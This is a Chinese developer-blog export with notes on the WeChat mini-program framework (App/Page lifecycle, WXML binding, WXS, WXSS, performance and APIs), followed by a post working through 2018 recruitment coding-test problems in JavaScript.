每个页面有独立的作用域，并提供模块化能力； 由于框架并非运行在浏览器中，所以 JavaScript 在 web 中一些能力都无法使用，如 document，window 等； 开发者写的所有代码最终将会打包成一份 JavaScript，并在小程序启动的时候运行，直到小程序销毁。类似 ServiceWorker，所以逻辑层也称之为 App Service。 注册程序APP() App()函数用来注册一个小程序。接受一个object参数，其指定小程序的生命周期函数等。 前台、后台定义：当用户点击左上角关闭，或者按了设备 Home 键离开微信，小程序并没有直接销毁，而是进入了后台；当再次进入微信或再次打开小程序，又会从后台进入前台。需要注意的是：只有当小程序进入后台一定时间，或者系统资源占用过高，才会被真正的销毁。 关闭小程序(基础库版本1.1.0开始支持)：当用户从扫一扫、转发等入口(场景值为1007, 1008, 1011, 1025)进入小程序，且没有置顶小程序的情况下退出，小程序会被销毁。小程序运行机制在基础库版本 1.4.0 有所改变：上一条关闭逻辑在新版本已不适用，。 getAPP() 提供了全局的getApp()函数，可以获取到小程序实例。 注意：App()必须在app.js中注册，且不能注册多个。 不要在定义于App()内的函数中调用getApp()，使用this就可以拿到app实例。 不要在onLaunch的时候调用getCurrentPage()，此时page还没有生成。 通过getApp()获取实例之后，不要私自调用生命周期函数。 场景值场景值描述了开启小程序的来源，例如如果从发现栏小程序主入口开启，场景值为1001。可以在 App 的 onLaunch 和 onShow 中获取。 注册页面Page() Page() 函数用来注册一个页面。接受一个 object 参数，其指定页面的初始数据、生命周期函数、事件处理函数等。 初始化数据 将作为页面的第一次渲染。data 将会以 JSON 的形式由逻辑层传至渲染层，所以其数据必须是可以转成 JSON 的格式：字符串，数字，布尔值，对象，数组。渲染层可以通过 WXML 对数据进行绑定。 Page.prototype.route route字段可以获取到当前页面的路径。 Page.prototype.setData() setData 函数用于将数据从逻辑层发送到视图层，同时改变对应的 this.data 的值。 setData() 参数格式： 接受一个对象，以 key，value 的形式表示将 this.data 中的 key 对应的值改变成 value。ey 可以非常灵活，以数据路径的形式给出，如 array[2].message，a.b.c.d，并且不需要在 this.data 中预先定义。 注意： 直接修改 this.data 而不调用 this.setData 是无法改变页面的状态的，还会造成数据不一致 单次设置的数据不能超过1024kB，请尽量避免一次设置过多的数据。 Page实例的生命周期 路由页面路由：所有页面的路由全部由框架进行管理。 页面栈： 框架以栈的形式维护了当前的所有页面。当发生路由切换的时候，页面栈的表现如下： getCurrentPages() 用于获取当前页面栈的实例，以数组形式按栈的顺序给出，第一个元素为首页，最后一个元素为当前页面。(注意;不要尝试修改页面栈，会导致路由以及页面状态错误。) navigateTo,redirectTo只能打开非 tabBar 页面。 switchTab 只能打开 tabBar 页面。 reLaunch 可以打开任意页面。 页面底部的 tabBar 由页面决定，即只要是定义为 tabBar 的页面，底部都有 tabBar。 调用页面路由带的参数可以在目标页面的onLoad中获取。 模块化文件作用域：在JavaScript文件中声明的变量和函数只在该文件中有效；不同的文件中可以声明相同名字的变量和函数，不会互相影响。 通过全局函数getApp()可以获取全局的应用实例，如果需要全局的数据可以在App()中设置全局数据。 模块化： 将一些公共的代码抽离成为一个单独的js文件，作为一个模块。模块只有通过module.exports或者 exports才能对外暴露接口。​在需要使用这些模块的文件中，使用require(path)将公共代码引入(tips: require暂时不支持绝对路径)。 注意： exports是module.exports的一个引用，因此在模块里边随意更改exports的指向会造成未知的错误。所以我们更推荐开发者采用module.exports来暴露模块接口，除非你已经清晰知道这两者的关系。 视图层(View)WXMLWXML(WeiXin Markup Language)是框架设计的一套标签语言，结合基础组件、事件系统，可以构建出页面的结构。 WXML具有数据绑定、列表渲染、条件渲染、模板、事件、引用等功能。 数据绑定WXML中的动态数据均来自对应Page的 data对象中的数据。数据绑定使用 双大括号 将变量包起来。 （1）用于内容： &lt;view&gt; {{ message }} &lt;/view&gt; （2）组件属性(需要在双引号之内)： &lt;view id=&quot;item-{{id}}&quot;&gt; &lt;/view&gt; （3）控制属性(需要在双引号之间)： &lt;view wx:if=&quot;{{condition}}&quot;&gt; &lt;/view&gt; （4）关键字(需要在双引号之间)： &lt;checkbox checked=&quot;{{false}}&quot;&gt; &lt;/checkbox&gt; 其中 false：boolean 类型的 false，代表假值。注意: 特别注意：不要直接写 checked=&quot;false&quot;，其计算结果是一个字符串，转成 boolean 类型后代表真值。 （5）计算： 可以在{{}}内进行简单的运算。支持以下几种方式， 三元运算： &lt;view hidden="{{flag ? true : false}}&quot;&gt; Hidden &lt;/view&gt; 算数运算： view&gt; {{a + b}} + {{c}} + d &lt;/view&gt; 逻辑判断： &lt;view wx:if=&quot;{{length > 5}}&quot;&gt; &lt;/view&gt; 字符串运算： &lt;view&gt;{{"hello" + name}}&lt;/view&gt; 数据路径运算： &lt;view&gt;{{object.key}} {{array[0]}}&lt;/view&gt; 组合： 也可以在Mustache(双大括号)内直接进行组合，构成新的对象或者数组。 数组：&lt;view wx:for-items=&quot;{{[zero, 1, 2, 3, 4]}}&quot;&gt; {{item}} &lt;/view&gt; Page({ data: { zero: 0 } }) 对象： &lt;template is=&quot;objectCombine&quot; data=&quot;{{for: a, bar: b}}&quot;&gt;&lt;/template&gt;， 最终组合成的对象是{for: 1, bar: 2} Page({ data: { a: 1, b: 2 } }) 也可以用扩展运算符…来将一个对象展开，&lt;template is=&quot;objectCombine&quot; data=&quot;{{...obj1, ...obj2, e: 5}}&quot;&gt;&lt;/template&gt;,最终组合成的对象是{a: 1, b: 2, c: 3, d: 4, e: 5} Page({ data: { obj1: { a: 1, b: 2 }, obj2: { c: 3, d: 4 } } }) 注意：注意：上述方式可以随意组合，但是如有存在变量名相同的情况，后边的会覆盖前面，如&lt;template is=&quot;objectCombine&quot; data=&quot;{{...obj1, ...obj2, a, c: 6}}&quot;&gt;&lt;/template&gt;，根据以下数据，最终组合成的对象是 {a: 5, b: 3, c: 6}。 Page({ data: { obj1: { a: 1, b: 2 }, obj2: { b: 3, c: 4 }, a: 5 } }) 注意： 花括号和引号之间如果有空格，将最终被解析成为字符串,如下 &lt;view wx:for=&quot;{{[1,2,3]}} &quot;&gt; {{item}} &lt;/view&gt; 等同于 &lt;view wx:for=&quot;{{[1,2,3] + ' '}}&quot;&gt; {{item}} &lt;/view&gt; 列表渲染（1）wx:for wx:for 在组件上使用 wx:for 控制属性绑定一个数组，即可使用数组中各项的数据重复渲染该组件。默认数组的当前项的下标变量名默认为 index，数组当前项的变量名默认为 item。 &lt;view wx:for=&quot;{{array}}&quot;&gt; {{index}}: {{item.message}} &lt;/view&gt; wx:for-item 指定数组当前元素的变量名。 wx:for-index 指定数组当前下标的变量名。 &lt;view wx:for=&quot;{{array}}&quot; wx:for-index=&quot;idx&quot; wx:for-item=&quot;itemName&quot;&gt; {{idx}} {{itemName.message}} &lt;/view&gt; wx:for 也可以嵌套，下边是一个九九乘法表： 1234567&lt;view wx:for=&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&quot; wx:for-item=&quot;i&quot;&gt; &lt;view wx:for=&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot; wx:for-item=&quot;j&quot;&gt; &lt;view wx:if=&quot;&#123;&#123;i &lt;= j&#125;&#125;&quot;&gt; &#123;&#123;i&#125;&#125; *&#123;&#123;j&#125;&#125; = &#123;&#123;i * j&#125;&#125; &lt;/view&gt; &lt;/view&gt;&lt;/view&gt; （2）block wx:for 将 wx:for 用在&lt;block/&gt;标签上，以渲染一个包含多节点的结构块。 &lt;block wx:for=&quot;{{[1, 2, 3]}}&quot;&gt; &lt;view&gt; {{index}}: &lt;/view&gt; &lt;view&gt; {{item}} &lt;/view&gt; &lt;/block&gt; （3）wx:key 如果列表中项目的位置会动态改变或者有新的项目添加到列表中，并且希望列表中的项目保持自己的特征和状态（如 &lt;input/&gt; 中的输入内容，&lt;switch/&gt; 的选中状态），需要使用 wx:key 来指定列表中项目的唯一的标识符。 wx:key 的值以两种形式提供: 1.字符串，代表在 for 循环的 array 中 item 的某个 property，该 property 的值需要是列表中唯一的字符串或数字，且不能动态改变。 2.保留关键字 *this 代表在 for 循环中的 item 本身，这种表示需要 item 本身是一个唯一的字符串或者数字，如： 当数据改变触发渲染层重新渲染的时候，会校正带有 key 的组件，框架会确保他们被重新排序，而不是重新创建，以确保使组件保持自身的状态，并且提高列表渲染时的效率。 注意： 当 wx:for 的值为字符串时，会将字符串解析成字符串数组。 &lt;view wx:for=&quot;array&quot;&gt; {{item}} &lt;/view&gt; 等同于 &lt;view wx:for=&quot;{{['a','r','r','a','y']}}&quot;&gt; {{item}} &lt;/view&gt; 条件渲染（1）wx:if 用wx:if=&quot;{{condition}}&quot;来判断是否需要渲染该代码块, &lt;view wx:if=&quot;{{condition}}&quot;&gt; True &lt;/view&gt;。也可以用wx:elif和wx:else来添加一个else块： &lt;view wx:if=&quot;{{length > 5}}&quot;&gt; 1 &lt;/view&gt; &lt;view wx:elif=&quot;{{length > 2}}&quot;&gt; 2 &lt;/view&gt; &lt;view wx:else&gt; 3 &lt;/view&gt; （2）block wx:if wx:if是一个控制属性，需要将它添加到一个标签上。如果想一次性判断多个组件标签，可以使用一个&lt;block/&gt;标签将多个组件包装起来，并在上边使用wx:if控制属性。 &lt;block wx:if=&quot;{{true}}&quot;&gt; &lt;view&gt; view1 &lt;/view&gt; &lt;view&gt; view2 &lt;/view&gt; &lt;/block&gt; 注意：&lt;block/&gt;并不是一个组件，它仅仅是一个包装元素，不会在页面中做任何渲染，只接受控制属性。 wx:if vs hidden 因为wx:if之中的模板也可能包含数据绑定，所以当wx:if的条件值切换时，框架有一个局部渲染的过程，因为它会确保条件块在切换时销毁或重新渲染。同时wx:if也是惰性的，如果在初始渲染条件为false，框架什么也不做，在条件第一次变成真的时候才开始局部渲染。 相比之下，hidden就简单的多，组件始终会被渲染，只是简单的控制显示与隐藏。 一般来说，wx:if有更高的切换消耗而hidden有更高的初始渲染消耗。因此，如果需要频繁切换的情景下，用hidden更好，如果在运行时条件不大可能改变则wx:if较好。 模板WXML提供模板（template），可以在模板中定义代码片段，然后在不同的地方调用。 模板拥有自己的作用域，只能使用data传入的数据。 （1）定义模板：使用name属性，作为模板的名字，然后在&lt;template/&gt;内定义代码片段。如下： &lt;template name=&quot;msgItem&quot;&gt; &lt;view&gt; &lt;text&gt; {{index}}: {{msg}} &lt;/text&gt; &lt;text&gt; Time: {{time}} &lt;/text&gt; &lt;/view&gt; &lt;/template&gt; （2）使用模板： 使用 is属性，声明需要使用的模板，然后将模板所需要的data传入。 &lt;template is=&quot;msgItem&quot; data=&quot;{{...item}}&quot;/&gt; Page({ data: { item: { index: 0, msg: &apos;this is a template&apos;, time: &apos;2016-09-15&apos; } } }) is 属性可以使用Mustache语法，来动态决定具体需要渲染哪个模板。 &lt;template name=&quot;odd&quot;&gt; &lt;view&gt; odd &lt;/view&gt; &lt;/template&gt; &lt;template name=&quot;even&quot;&gt; &lt;view&gt; even &lt;/view&gt; &lt;/template&gt; &lt;block wx:for=&quot;{{[1, 2, 3, 4, 5]}}&quot;&gt; &lt;template is=&quot;{item % 2 == 0 ? &apos;even&apos; : &apos;odd&apos;}}&quot;/&gt; &lt;/block&gt; 事件什么是事件： 事件是视图层到逻辑层的通讯方式。 事件可以将用户的行为反馈到逻辑层进行处理。 事件可以绑定在组件上，当达到触发事件，就会执行逻辑层中对应的事件处理函数。 事件对象可以携带额外信息，如id, dataset, touches。 （1）事件的使用方式 在组件中绑定一个事件处理函数，如 bindtap，当用户点击该组件的时候会在该页面对应的Page中找到相应的事件处理函数。&lt;view id=&quot;tapTest&quot; data-hi=&quot;WeChat&quot; bindtap=&quot;tapName&quot;&gt; Click me! &lt;/view&gt; 在相应的Page定义中写上相应的事件处理函数，参数是event。 Page({ tapName: function(event) { console.log(event) } }) 事件分为冒泡事件(当一个组件上的事件被触发后，该事件会向父节点传递)和非冒泡事件(当一个组件上的事件被触发后，该事件不会向父节点传递),WXML的冒泡事件列表如下： tips：除上表之外的其他组件自定义事件都是非冒泡事件，如&lt;form/&gt;的submit事件，&lt;input/&gt;的input事件，&lt;scroll-view/&gt;的scroll事件。 （2）事件的绑定 事件绑定的写法同组件的属性，以key、value的形式。 key以bind或catch开头，然后跟上事件的类型，如bindtap, catchtouchstart。 value是一个字符串，需要在对应的Page中定义同名的函数。不然当触发事件的时候会报错。 bind事件绑定不会阻止冒泡事件向上冒泡，catch事件绑定可以阻止冒泡事件向上冒泡。例如，如在下边这个例子中，点击inner view会先后触发handleTap3和handleTap2(因为tap事件会冒泡到middle view，而middle view阻止了tap事件冒泡，不再向父节点传递)，点击middle view会触发handleTap2，点击outter view会触发handleTap1。 &lt;view id=&quot;outter&quot; bindtap=&quot;handleTap1&quot;&gt; outer view &lt;view id=&quot;middle&quot; catchtap=&quot;handleTap2&quot;&gt; middle view &lt;view id=&quot;inner&quot; bindtap=&quot;handleTap3&quot;&gt; inner view &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; （3）事件对象 当组件触发事件时，逻辑层绑定该事件的处理函数会收到一个事件对象。事件对象属性如下： 在组件中可以定义数据，这些数据将会通过事件传递给 SERVICE。书写方式：以data-开头，多个单词由连字符-链接，不能有大写(大写会自动转成小写)如data-element-type，最终在 event.target.dataset 中会将连字符转成驼峰elementType。 引用WXML提供两种文件引用方式import和include。 （1）import import可以在该文件中使用目标文件定义的template。 import有作用域的概念，即只会import目标文件中定义的template，而不会import目标文件import的template。 （2）include include可以将目标文件除了&lt;template/&gt;的整个代码引入，相当于是拷贝到include位置。（感觉有点ejs中模板include的感觉） WXSWXS（WeiXin Script）是小程序的一套脚本语言，结合 WXML，可以构建出页面的结构。 注意: wxs 不依赖于运行时的基础库版本，可以在所有版本的小程序中运行。 wxs 与 javascript 是不同的语言，有自己的语法，并不和 javascript 一致。 wxs 的运行环境和其他 javascript 代码是隔离的，wxs 中不能调用其他 javascript 文件中定义的函数，也不能调用小程序提供的API。 wxs 函数不能作为组件的事件回调。 由于运行环境的差异，在 iOS 设备上小程序内的 wxs 会比 javascript 代码快 2 ~ 20 倍。在 android 设备上二者运行效率无差异。 wxs用于页面渲染的使用示例，页面输出 hello world： &lt;!--wxml--&gt; &lt;wxs module=&quot;m1&quot;&gt; var msg = &quot;hello world&quot;; module.exports.message = msg; &lt;/wxs&gt; &lt;view&gt; {{m1.message}} &lt;/view&gt; wxs还可用于数据处理。 WXS模块WXS 代码可以编写在 wxml 文件中的 &lt;wxs&gt; 标签内，或以 .wxs 为后缀名的文件内。 每一个 .wxs 文件和 &lt;wxs&gt; 标签都是一个单独的模块。 每个模块都有自己独立的作用域。即在一个模块里面定义的变量与函数，默认为私有的，对其他模块不可见。 一个模块要想对外暴露其内部的私有变量与函数，只能通过 module.exports 实现。 每个 wxs 模块均有一个内置的 module 对象,通过exports属性，可以对外共享本模块的私有变量与函数。 在.wxs模块中引用其他 wxs 文件模块，可以使用 require 函数。引用的时候，要注意如下几点： 只能引用 .wxs 文件模块，且必须使用相对路径。 wxs 模块均为单例，wxs 模块在第一次被引用时，会自动初始化为单例对象。多个页面，多个地方，多次引用，使用的都是同一个 wxs 模块对象。 如果一个 wxs 模块在定义之后，一直没有被引用，则该模块不会被解析与运行。 变量WXS 中的变量均为值的引用。 没有声明的变量直接赋值使用，会被定义为全局变量。 如果只声明变量而不赋值，则默认值为 undefined。 var表现与javascript一致，会有变量提升。 注释单行注释 // 多行注释/* */ 数据类型WXS 语言目前共有以下几种数据类型： number ： 数值 string ：字符串 boolean：布尔值 object：对象 function：函数 array : 数组 date：日期 regexp：正则 (1)number 整数、小数 方法： toString toLocaleString valueOf toFixed toExponential toPrecision (2)string 方法: toString valueOf charAt charCodeAt concat indexOf lastIndexOf localeCompare match replace search slice split substring toLowerCase toLocaleLowerCase toUpperCase toLocaleUpperCase trim (3)boolean 方法: toString valueOf (4)object 方法: toString：返回字符串 &quot;[object Object]&quot; (5)function 方法: toString：返回字符串 &quot;[function Function]&quot;。 (6)array 方法: toString concat join pop push reverse shift slice sort splice unshift indexOf lastIndexOf every some forEach map filter reduce reduceRight (7)date 生成 date 对象需要使用 getDate()函数, 返回一个当前时间的对象。date类型还有很多方法。 (8)regexp 生成 regexp 对象需要使用 getRegExp()函数。 方法有exec、test、toString。 tips: 数据类型的判断可以使用 constructor 属性。使用 typeof 也可以区分部分数据类型。 WXSSWXSS(WeiXin Style Sheets)是一套样式语言，用于描述WXML的组件样式。WXSS具有CSS大部分特性。同时为了更适合开发微信小程序，对CSS进行了扩充以及修改。扩展的特性有尺寸单位、样式导入。 尺寸单位：px（responsive pixel），可以根据屏幕宽度进行自适应。规定屏幕宽为750rpx。如在iPhone6上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像。 样式导入：使用@import语句可以导入外联样式表，@import跟需要导入的外联样式表的相对路径（相对路径放在引号中），用;表示语句结束。 内联样式：框架组件上支持使用style、class属性来控制组件的样式。 style：静态的样式统一写到class中。style接收动态的样式，在运行时会进行解析，尽量避免将静态的样式写进style中，以免影响渲染速度。&lt;view style=&quot;color:{{color}};&quot; /&gt; 兼容小程序的功能不断的增加，但是旧版本的微信客户端并不支持新功能，所以在使用这些新能力的时候需要做兼容。文档会在组件，API等页面描述中带上各个功能所支持的版本号。 可以通过wx.getSystemInfo或者wx.getSystemInfoSync获取到小程序的基础库版本号。也可以通过 wx.canIUse 来判断是否可以在该基础库版本下直接使用对应的API或者组件。 接口对于新增的 API，可以用以下代码来判断是否支持用户的手机。 if (wx.openBluetoothAdapter) { wx.openBluetoothAdapter() } else { // 如果希望用户在最新版本的客户端上体验您的小程序，可以这样子提示 wx.showModal({ title: &apos;提示&apos;, content: &apos;当前微信版本过低，无法使用该功能，请升级到最新微信版本后重试。&apos; }) } 参数对于 API 的参数或者返回值有新增的参数，可以用以下代码判断。 wx.showModal({ success: function(res) { if (wx.canIUse(&apos;showModal.cancel&apos;)) { console.log(res.cancel) } } }) 组件对于组件，新增的属性在旧版本上不会被处理，不过也不会报错。如果特殊场景需要对旧版本做一些降级处理，可以这样子做。 Page({ data: { canIUse: wx.canIUse(&apos;button.open-type.contact&apos;) } }) &lt;!-- wxml --&gt; &lt;button wx:if=&quot;{{canIUse}}&quot; open-type=&quot;contact&quot;&gt; 客服消息 &lt;/button&gt; &lt;contact-button wx:else&gt;&lt;/contact-button&gt; 运行机制小程序没有重启的概念 当小程序进入后台，客户端会维持一段时间的运行状态，超过一定时间后（目前是5分钟）会被微信主动销毁 置顶的小程序不会被微信主动销毁 当收到系统内存告警也会进行小程序的销毁 再次打开逻辑： 基础库 1.4.0 开始支持，低版本需做兼容处理。 用户打开小程序的预期有以下两类场景： A. 打开首页： 场景值有 1001, 1019, 1022, 1023, 1038, 1056 B. 打开小程序指定的某个页面： 场景值为除 A 以外的其他 性能优化setData是小程序开发中使用最频繁的接口，也是最容易引发性能问题的接口。 setData工作原理： 小程序的视图层目前使用 WebView 作为渲染载体，而逻辑层是由独立的 JavascriptCore 作为运行环境。在架构上，WebView 和 JavascriptCore 都是独立的模块，并不具备数据直接共享的通道。当前，视图层和逻辑层的数据传输，实际上通过两边提供的evaluateJavascript所实现。即用户传输的数据(由视图层去往逻辑层)，需要将其转换为字符串形式传递，同时把转换后的数据内容拼接成一份 JS 脚本，再通过执行 JS 脚本的形式传递到两边独立环境。 而evaluateJavascript的执行会受很多方面的影响，数据到达视图层并不是实时的。同一进程内的 WebView 实际上会共享一个 JS VM，如果 WebView 内 JS 线程正在执行渲染或其他逻辑，会影响 evaluateJavascript 脚本的实际执行时间，另外多个 WebView 也会抢占 JS VM 的执行权限；另外还有 JS 本身的编译执行耗时，都是影响数据传输速度的因素。 常见的 setData 操作错误(1)频繁的去 setData。 Android 下用户在滑动时会感觉到卡顿，操作反馈延迟严重；渲染有出现延时。 (2) 每次 setData 都传递大量新数据。 (3)后台态页面进行 setData。 图片资源图片资源的主要性能问题在于大图片和长列表图片上，这两种情况都有可能导致 iOS 客户端内存占用上升，从而触发系统回收小程序页面。除了内存问题外，大图片也会造成页面切换的卡顿。 代码包大小的优化小程序一开始时代码包限制为 1MB，后增加到 2MB 。代码包上限的增加对于开发者来说，能够实现更丰富的功能，但对于用户来说，也增加了下载流量和本地空间的占用。 控制代码包内图片资源： 小程序代码包经过编译后，会放在微信的 CDN 上供用户下载，CDN 开启了 GZIP 压缩，所以用户下载的是压缩后的 GZIP 包，其大小比代码包原体积会更小。 GZIP 对基于文本资源的压缩效果最好，在压缩较大文件时往往可高达 70%-80% 的压缩率，而如果对已经压缩的资源（例如大多数的图片格式）则效果甚微。 及时清理没有使用到的代码和资源： 在日常开发的时候，我们可能引入了一些新的库文件，而过了一段时间后，由于各种原因又不再使用这个库了，我们常常会只是去掉了代码里的引用，而忘记删掉这类库文件了。目前小程序打包是会将工程下所有文件都打入代码包内，也就是说，这些没有被实际使用到的库文件和资源也会被打入到代码包里，从而影响到整体代码包的大小。 组件框架为开发者提供了一系列基础组件，开发者可以通过组合这些基础组件进行快速开发。 组件是视图层的基本组成单元。 组件自带一些功能与微信风格的样式。 一个组件通常包括开始标签和结束标签，属性用来修饰这个组件，内容在两个标签之内。 注意：所有组件与属性都是小写，以连字符-连接。 基础组件分为以下八大类： 视图容器： view(视图容器)、 scroll-view（可滚动视图容器）、 swiper(可滑动视图容器) 基础内容： icon(图标)、 text(文字)、 progress(进度条) 表单： button 按钮 form 表单 input 输入框 checkbox 多项选择器 radio 单项选择器 picker 列表选择器 picker-view 内嵌列表选择器 slider 滑动选择器 switch 开关选择器 label 标签 导航： navigator(应用内跳转) 多媒体： audio 音频 image 图片 video 视频 地图： map(地图) 画布： canvas(画布) 客服会话： contact-button(进入客服会话按钮) API框架提供丰富的微信原生API，可以方便的调起微信提供的能力，如获取用户信息，本地存储，支付功能等。 wx.on开头的API是监听某个事件发生的API接口，接受一个CALLBACK函数作为参数。当该事件触发时，会调用CALLBACK函数。 如未特殊约定，其他API接口都接受一个OBJECT作为参数。 OBJECT中可以指定success,fail,complete来接收接口调用结果。 网络APIwx.request 发起网络请求 wx.uploadFile 上传文件 wx.downloadFile 下载文件 wx.connectSocket 创建WebSocket连接 wx.onSocketOpen 监听WebSocket打开 wx.onSocketError 监听WebSocket错误 wx.sendSocketMessage 发送WebSocket消息 wx.onSocketMessage 接受WebSocket消息 wx.closeSocket 关闭WebSocket连接 wx.onSocketClose 监听WebSocket关闭 媒体APIwx.chooseImage 从相册选择图片，或者拍照 wx.previewImage 预览图片 wx.startRecord 开始录音 wx.stopRecord 结束录音 wx.playVoice 播放语音 wx.pauseVoice 暂停播放语音 wx.stopVoice 结束播放语音 wx.getBackgroundAudioPlayerState 获取音乐播放状态 wx.playBackgroundAudio 播放音乐 wx.pauseBackgroundAudio 暂停播放音乐 wx.seekBackgroundAudio 控制音乐播放进度 wx.stopBackgroundAudio 停止播放音乐 wx.onBackgroundAudioPlay 监听音乐开始播放 wx.onBackgroundAudioPause 监听音乐暂停 wx.onBackgroundAudioStop 监听音乐结束 wx.chooseVideo 从相册选择视频，或者拍摄 文件APIwx.saveFile 保存文件 wx.getSavedFileList 获取已保存的文件列表 wx.getSavedFileInfo 获取已保存的文件信息 wx.removeSavedFile 删除已保存的文件信息 wx.openDocument 打开文件 数据APIwx.getStorage 获取本地数据缓存 wx.getStorageSync 获取本地数据缓存 wx.setStorage 设置本地数据缓存 wx.setStorageSync 设置本地数据缓存 wx.getStorageInfo 获取本地缓存的相关信息 wx.getStorageInfoSync 获取本地缓存的相关信息 wx.removeStorage 删除本地缓存内容 wx.removeStorageSync 删除本地缓存内容 wx.clearStorage 清理本地数据缓存 wx.clearStorageSync 清理本地数据缓存 位置APIwx.getLocation 获取当前位置 wx.chooseLocation 打开地图选择位置 wx.openLocation 打开内置地图 wx.createMapContext 地图组件控制 设备APIwx.getNetworkType 获取网络类型 wx.onNetworkStatusChange 监听网络状态变化 wx.getSystemInfo 获取系统信息 wx.getSystemInfoSync 获取系统信息 wx.onAccelerometerChange 监听加速度数据 wx.startAccelerometer 开始监听加速度数据 wx.stopAccelerometer 停止监听加速度数据 wx.onCompassChange 监听罗盘数据 wx.startCompass 开始监听罗盘数据 wx.stopCompass 停止监听罗盘数据 wx.setClipboardData 设置剪贴板内容 wx.getClipboardData 获取剪贴板内容 wx.makePhoneCall 拨打电话 wx.scanCode 扫码 界面APIwx.showToast 显示提示框 wx.showLoading 显示加载提示框 wx.hideToast 隐藏提示框 wx.hideLoading 隐藏加载提示框 wx.showModal 显示模态弹窗 wx.showActionSheet 显示菜单列表 wx.setNavigationBarTitle 设置当前页面标题 wx.showNavigationBarLoading 显示导航条加载动画 wx.hideNavigationBarLoading 隐藏导航条加载动画 wx.navigateTo 新窗口打开页面 wx.redirectTo 原窗口打开页面 wx.switchTab 切换到 tabbar 页面 wx.navigateBack 退回上一个页面 wx.createAnimation 动画 wx.createCanvasContext 创建绘图上下文 wx.drawCanvas 绘图 wx.stopPullDownRefresh 停止下拉刷新动画 WXML节点信息APIwx.createSelectorQuery 创建查询请求 selectorQuery.select 根据选择器选择单个节点 selectorQuery.selectAll 根据选择器选择全部节点 selectorQuery.selectViewport 选择显示区域 nodesRef.boundingClientRect 获取布局位置和尺寸 nodesRef.scrollOffset 获取滚动位置 nodesRef.fields 获取任意字段 selectorQuery.exec 执行查询请求 开放接口wx.login 登录 wx.getUserInfo 获取用户信息 wx.chooseAddress 获取用户收货地址 wx.requestPayment 发起微信支付 wx.addCard 添加卡券 wx.openCard 打开卡券]]></content>
      <categories>
        <category>WeChat MiniPro</category>
      </categories>
      <tags>
        <tag>WeChat MiniPro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018春招研发岗在线模拟笔试编程题总结]]></title>
    <url>%2F2018%2F03%2F24%2F2018-Tencent-spring-programming-simulation%2F</url>
    <content type="text"><![CDATA[2018春季腾讯研发岗在线模拟笔试算法题目总结。 给出四个点的坐标判断是否为正方形思路：暴力方法，求出任意两点之间的距离，如果有四条相等，剩下两条距离相等，则构成正方形。 123456789101112131415161718192021222324 //给出四个点的坐标，判断这四个点能否构成一个正方形，其中四个点的横坐标存在x数组中，与横坐标对应的纵坐标存在y数组中 function judgeSquare(x, y) &#123; var dists = []; //用来存放四边形任意两点之间的距离 for (var i = 0; i &lt; 4; i++) &#123; for (var j = i + 1; j &lt; 4; j++) &#123; var dist = distance(x[i], y[i], x[j], y[j]); dists.push(dist); &#125; &#125; dists = dists.sort(); if (dists[0] === dists[1] &amp;&amp; dists[1] === dists[2] &amp;&amp; dists[2] === dists[3] &amp;&amp; dists[4] === dists[5]) &#123; console.log('Yes, this is a square!'); &#125; &#125;// distance表示两点之间距离的平方 function distance(x1, y1, x2, y2) &#123; //参数x1,y1和x2,y2分别表示两个点的横纵坐标 var distance = Math.pow(x1 - x2, 2) + Math.pow(y1 - y2, 2); return distance; &#125; var xArr = [0, 2, 2, 0]; var yArr = [0, 2, 0, 2]; judgeSquare(xArr, yArr); //Yes, this is a square! 2^k面值的n组合问题问题描述：（记不清了，大概是这样,k和n的上限也记不得了，只记录下实现思路）有面值分别为2^k的硬币各2枚(k&gt;=0，且k为整数)，现在要买n元的东西，问有多少种不同的硬币组合方式？ 思路：从最小面额的开始考虑， (1)如果给出的n元是偶数，那么又分为花掉面额为1的(如果花掉面额为1的肯定是花掉2个)，和不花掉面额为1的。 如果花掉两个面额为1的，那么问题的规模就缩小为求n-2的组合情况(即n-2要用2，4，8…来组合，因为此时1已经用光了)，又因为n-2也是个偶数，所以可以对半分，即(n-2)/2用1，2，4，8…来组合，可以用递归了。 如果不花掉面额为1的，那么从面额2开始花起，又n为偶数，所以问题的规模可以对半分为，求n/2用 1，2，4，8…来组合，可以用递归了。 (2)如果给出的n元是奇数，那么肯定要花掉一个面额为1的，那么n-1是个偶数，此时已经不能再花面额为1的了，即n是奇数的时候只能花掉一个面额为1的，所以问题规模就变成了n-1用面额为2，4，8…来组合，即问题规模折半为(n-1)/2用1，2，4，8…来组合，可以用递归了。 12345678910111213141516171819function combination(n) &#123; // 初始条件 // if (n === 1) &#123; // return 1; // &#125; // if (n === 2) &#123; // return 2; // &#125; if (n &lt;= 2) &#123; return n; &#125; // 先判断n的奇偶性 if (n % 2 === 0) &#123; //n为偶数 return combination((n - 2) / 2) + combination(n / 2); &#125; else &#123; return combination((n - 1) / 2); &#125;&#125;combination(12); //5 头条： 打印一行数字的字符串形式思路：将0-9的数字的打印形式保存成一个二维数组，例如num[0]中保存了数字0一到第五行的打印字符串形式，然后一行一行的打印（总共打印五行，因为每个数字用五行字符串描述），每一行由给出的数组中的数字的第i行的字符串形式拼接起来再打印。 1234567891011121314151617181920212223242526272829 //将0-9的数字的打印形式保存成一个二维数组，例如num[0]中保存了数字0一到第五行的打印字符串形式 var num = [['66666', '6...6', '6...6', '6...6', '66666'], ['....6', '....6', '....6', '....6', '....6'], ['66666', '....6', '66666', '6....', '66666'], ['66666', '....6', '66666', '....6', '66666'], ['6...6', '6...6', '66666', '....6', '....6'], ['66666', '6....', '66666', '....6', '66666'], ['66666', '6....', '66666', '6...6', '66666'], ['66666', '....6', '....6', '....6', '....6'], ['66666', '6...6', '66666', '6...6', '66666'], ['66666', '6...6', '66666', '....6', '66666']]; var numArr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]; //测试数组 // 一行一行的打印，每个数字用五行表示，每两个数字之间用两个点点分隔开 for (var i = 0; i &lt; 5; i ++) &#123; var resultStr = ''; //保存每一行结果的字符串 // 将第numArr中的numArr.length个数字的第i行拼接起来并打印 for (var j = 0; j &lt; numArr.length; j ++) &#123; resultStr += num[numArr[j]][i] + '..'; &#125; // 每一行最后会多两个点点，截取掉 var len = resultStr.length - 2; console.log(resultStr.substring(0, len)); 